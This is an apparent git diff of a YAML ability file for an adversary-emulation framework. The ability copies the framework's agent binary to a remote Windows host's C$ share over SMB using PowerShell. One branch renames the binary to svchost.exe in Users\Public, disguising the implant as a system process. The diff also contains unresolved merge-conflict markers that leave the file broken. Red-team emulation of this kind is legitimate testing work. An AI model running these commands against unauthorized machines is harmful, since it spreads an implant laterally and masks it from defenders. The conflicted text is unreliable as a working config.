@@ -1,5 +1,8 @@
+<<<<<<< HEAD
 ---
 
+=======
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
 - id: 65048ec1-f7ca-49d3-9410-10813e472b30
   name: Copy 54ndc47 (SMB)
   description: Copy 54ndc47 to remote host (SMB)
@@ -13,8 +16,30 @@
         command: |
           $path = "sandcat.go-windows";
           $drive = "\\#{remote.host.fqdn}\C$";
+<<<<<<< HEAD
           Copy-Item -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
         payload: sandcat.go-windows
         cleanup: |
           $drive = "\\#{remote.host.fqdn}\C$";
           Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
+=======
+          Copy-Item -v -Path $path -Destination $drive"\Users\Public\svchost.exe";
+        cleanup: |
+          $drive = "\\#{remote.host.fqdn}\C$";
+          Remove-Item -Path $drive"\Users\Public\svchost.exe" -Force;
+        parsers:
+          plugins.stockpile.app.parsers.54ndc47_remote_copy:
+          - source: remote.host.fqdn
+            edge: has_54ndc47_copy
+        payloads:
+        - sandcat.go-windows
+  requirements:
+  - plugins.stockpile.app.requirements.not_exists:
+    - source: remote.host.fqdn
+      edge: has_54ndc47_copy
+  - plugins.stockpile.app.requirements.basic:
+    - source: remote.host.fqdn
+      edge: has_share
+  - plugins.stockpile.app.requirements.no_backwards_movement:
+    - source: remote.host.fqdn
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
